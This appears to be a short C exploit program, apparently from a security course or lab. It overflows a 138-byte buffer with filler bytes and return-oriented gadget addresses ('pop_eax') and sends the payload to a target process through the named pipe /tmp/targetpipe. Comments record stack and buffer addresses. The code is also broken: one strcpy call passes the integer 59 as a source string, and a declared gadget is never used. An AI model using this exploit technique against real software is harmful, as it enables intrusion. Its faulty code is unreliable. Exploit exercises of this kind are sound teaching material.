#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[138];
  char trap[] = "\xe5\xb6\xa9\xbb";
  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);
  
  strcpy(bufr + 131, pop_eax);
  strcpy(bufr + 135, 59);
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5